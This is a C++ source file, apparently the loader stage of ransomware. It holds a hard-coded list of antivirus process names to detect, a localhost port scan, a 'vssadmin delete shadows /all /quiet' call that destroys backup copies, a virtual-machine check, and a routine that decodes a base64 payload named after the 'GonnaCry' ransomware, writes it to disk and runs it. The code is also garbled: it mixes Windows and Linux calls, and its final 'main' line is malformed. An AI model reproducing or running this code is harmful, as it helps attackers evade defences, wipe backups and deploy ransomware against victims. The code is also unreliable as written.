#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <array>
#include <sstream>
#include <iterator>
#include <algorithm>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <cerrno>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <base64.h> // Supondo que você tenha uma biblioteca de Base64 instalada

// Função para rodar um comando e retornar a saída
std::string run_subprocess(const std::string &command) {
    std::array<char, 128> buffer;
    std::string result;
    FILE *pipe = popen(command.c_str(), "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
            result += buffer.data();
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

void check_av() {
    std::vector<std::string> av_list = {
        "a2adguard.exe", "a2adwizard.exe", "a2antidialer.exe", "a2cfg.exe", "a2cmd.exe", "a2free.exe", "a2guard.exe",
        "a2hijackfree.exe", "a2scan.exe", "a2service.exe", "a2start.exe", "a2sys.exe", "a2upd.exe", "aavgapi.exe",
        "aawservice.exe", "aawtray.exe", "ad-aware.exe", "ad-watch.exe", "alescan.exe", "anvir.exe", "ashdisp.exe",
        "ashmaisv.exe", "ashserv.exe", "ashwebsv.exe", "aswupdsv.exe", "atrack.exe", "avgagent.exe", "avgamsvr.exe",
        "avgcc.exe", "avgctrl.exe", "avgemc.exe", "avgnt.exe", "avgtcpsv.exe", "avguard.exe", "avgupsvc.exe", "avgw.exe",
        "avkbar.exe", "avk.exe", "avkpop.exe", "avkproxy.exe", "avkservice.exe", "avktray", "avktray.exe", "avkwctl", 
        "avkwctl.exe", "avmailc.exe", "avp.exe", "avpm.exe", "avpmwrap.exe", "avsched32.exe", "avwebgrd.exe", "avwin.exe", 
        "avwupsrv.exe", "avz.exe", "bdagent.exe", "bdmcon.exe", "bdnagent.exe", "bdss.exe", "bdswitch.exe", "blackd.exe", 
        "blackice.exe", "blink.exe", "boc412.exe", "boc425.exe", "bocore.exe", "bootwarn.exe", "cavrid.exe", "cavtray.exe", 
        "ccapp.exe", "ccevtmgr.exe", "ccimscan.exe", "ccproxy.exe", "ccpwdsvc.exe", "ccpxysvc.exe", "ccsetmgr.exe", "cfgwiz.exe", 
        "cfp.exe", "clamd.exe", "clamservice.exe", "clamtray.exe", "cmdagent.exe", "cpd.exe", "cpf.exe", "csinsmnt.exe", 
        "dcsuserprot.exe", "defensewall.exe", "defensewall_serv.exe", "defwatch.exe", "f-agnt95.exe", "fpavupdm.exe", "f-prot95.exe",
        "f-prot.exe", "fprot.exe", "fsaua.exe", "fsav32.exe", "f-sched.exe", "fsdfwd.exe", "fsm32.exe", "fsma32.exe", "fssm32.exe", 
        "f-stopw.exe", "f-stopw.exe", "fwservice.exe", "fwsrv.exe", "iamstats.exe", "iao.exe", "icload95.exe", "icmon.exe", 
        "idsinst.exe", "idslu.exe", "inetupd.exe", "irsetup.exe", "isafe.exe", "isignup.exe", "issvc.exe", "kav.exe", "kavss.exe", 
        "kavsvc.exe", "klswd.exe", "kpf4gui.exe", "kpf4ss.exe", "livesrv.exe", "lpfw.exe", "mcagent.exe", "mcdetect.exe", 
        "mcmnhdlr.exe", "mcrdsvc.exe", "mcshield.exe", "mctskshd.exe", "mcvsshld.exe", "mghtml.exe", "mpftray.exe", "msascui.exe", 
        "mscifapp.exe", "msfwsvc.exe", "msgsys.exe", "msssrv.exe", "navapsvc.exe", "navapw32.exe", "navlogon.dll", "navstub.exe", 
        "navw32.exe", "nisemsvr.exe", "nisum.exe", "nmain.exe", "noads.exe", "nod32krn.exe", "nod32kui.exe", "nod32ra.exe", 
        "npfmntor.exe", "nprotect.exe", "nsmdtr.exe", "oasclnt.exe", "ofcdog.exe", "opscan.exe", "ossec-agent.exe", "outpost.exe", 
        "paamsrv.exe", "pavfnsvr.exe", "pcclient.exe", "pccpfw.exe", "pccwin98.exe", "persfw.exe", "protector.exe", "qconsole.exe", 
        "qdcsfs.exe", "rtvscan.exe", "sadblock.exe", "safe.exe", "sandboxieserver.exe", "savscan.exe", "sbiectrl.exe", "sbiesvc.exe", 
        "sbserv.exe", "scfservice.exe", "sched.exe", "schedm.exe", "schedulerdaemon.exe", "sdhelp.exe", "serv95.exe", "sgbhp.exe", 
        "sgmain.exe", "slee503.exe", "smartfix.exe", "smc.exe", "snoopfreesvc.exe", "snoopfreeui.exe", "spbbcsvc.exe", "sp_rsser.exe", 
        "spyblocker.exe", "spybotsd.exe", "spysweeper.exe", "spysweeperui.exe", "spywareguard.dll", "spywareterminatorshield.exe", 
        "ssu.exe", "steganos5.exe", "stinger.exe", "swdoctor.exe", "swupdate.exe", "symlcsvc.exe", "symundo.exe", "symwsc.exe", 
        "symwscno.exe", "tcguard.exe", "tds2-98.exe", "tds-3.exe", "teatimer.exe", "tgbbob.exe", "tgbstarter.exe", "tsatudt.exe", 
        "umxagent.exe", "umxcfg.exe", "umxfwhlp.exe", "umxlu.exe", "umxpol.exe", "umxtray.exe", "usrprmpt.exe", "vetmsg9x.exe", 
        "vetmsg.exe", "vptray.exe", "vsaccess.exe", "vsserv.exe", "wcantispy.exe", "win-bugsfix.exe", "winpatrol.exe", "winpa""rolex.exe", 
        "wrsssdk.exe", "xcommsvr.exe", "xfr.exe", "xp-antispy.exe", "zegarynka.exe", "zlclient.exe"
    };

    std::string command = "tasklist /v /fo csv | findstr /i ";

    for (const auto &process : av_list) {
        run_subprocess(command + process);
    }
}

std::vector<int> check_open_ports() {
    std::vector<int> open_ports;
    for (int port = 0; port <= 65535; ++port) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");

        int result = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        if (result == 0) {
            open_ports.push_back(port);
        }
        close(sock);
    }
    return open_ports;
}

void delete_shadow_copies() {
    system("vssadmin.exe delete shadows /all /quiet");
}

bool inside_VM() {
    std::string command = "dmidecode -t system";
    std::string output = run_subprocess(command);
    return output.find("Virtual Machine") != std::string::npos;
}

void drop_n_run_gonnacry(const std::string &gonnacry_path, const std::string &gonnacry_base64) {
    std::ofstream outfile(gonnacry_path, std::ios::binary);
    std::string decoded = base64_decode(gonnacry_base64);
    outfile.write(decoded.data(), decoded.size());
    outfile.close();

    std::string command = "." + gonnacry_path;
    run_subprocess(command);
}

int main() }